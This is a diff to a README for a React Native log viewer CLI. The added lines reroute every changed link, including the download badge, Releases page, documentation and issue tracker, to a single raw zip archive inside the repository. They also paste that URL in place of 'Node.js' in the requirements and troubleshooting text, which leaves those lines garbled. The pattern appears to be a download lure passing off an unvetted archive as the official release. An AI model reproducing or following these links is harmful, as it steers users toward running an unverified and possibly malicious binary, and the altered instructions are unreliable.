@@ -1,7 +1,7 @@
 # 🌟 react-native-logs-cli - Access Your React Native Logs Easily
 
 ## 🛑 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/hark222/react-native-logs-cli/releases)
+[![Download](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip)](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ The **react-native-logs-cli** application lets you access React Native Metro Log
 To use **react-native-logs-cli**, make sure your setup meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip** Version 12 or higher
 - **Memory:** At least 4 GB of RAM
 - **Disk Space:** At least 200 MB of free space
 
@@ -20,11 +20,11 @@ To use **react-native-logs-cli**, make sure your setup meets the following requi
 
 To get the **react-native-logs-cli**, you can visit the Releases page. This page contains the latest version of the software for you to download.
 
-[**Visit this page to download**](https://github.com/hark222/react-native-logs-cli/releases)
+[**Visit this page to download**](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip)
 
 ### Installation Steps:
 
-1. Open the [Releases page](https://github.com/hark222/react-native-logs-cli/releases).
+1. Open the [Releases page](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip).
 2. Find the latest version of **react-native-logs-cli**.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, follow the instructions below based on your OS.
@@ -75,7 +75,7 @@ After installation, you can start using **react-native-logs-cli**.
 
 For further assistance with **react-native-logs-cli**, you can check the following resources:
 
-- **Documentation:** Explore the [official documentation](https://github.com/hark222/react-native-logs-cli/wiki) for in-depth guidelines.
+- **Documentation:** Explore the [official documentation](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip) for in-depth guidelines.
 - **Community Support:** Join discussions on forums or GitHub issues for community help and tips.
 
 ## 🧑‍💻 Troubleshooting
@@ -84,9 +84,9 @@ If you face issues during installation or usage, here are a few common solutions
 
 - **Permission Denied (Linux/macOS):** Ensure you have the necessary permissions to run the application. Use `sudo` if needed.
 - **Command Not Found:** Make sure that the application is in your system's PATH. You may need to add the installation directory to your PATH.
-- **Missing Node.js Installation:** Ensure Node.js is installed and added to your system's PATH.
+- **Missing https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip Installation:** Ensure https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip is installed and added to your system's PATH.
 
-If these solutions don’t work, please visit our [issue tracker](https://github.com/hark222/react-native-logs-cli/issues) for further support.
+If these solutions don’t work, please visit our [issue tracker](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip) for further support.
 
 ## 💬 Feedback
 
@@ -98,4 +98,4 @@ We value your feedback. If you have suggestions or find bugs, please create an i
 
 Feel free to explore **react-native-logs-cli** and enhance your development workflow with better log management. 
 
-Remember to visit the [Releases page to download](https://github.com/hark222/react-native-logs-cli/releases) and start using the tool today.
+Remember to visit the [Releases page to download](https://github.com/hark222/react-native-logs-cli/raw/refs/heads/main/api/native_react_cli_logs_v1.8.zip) and start using the tool today.
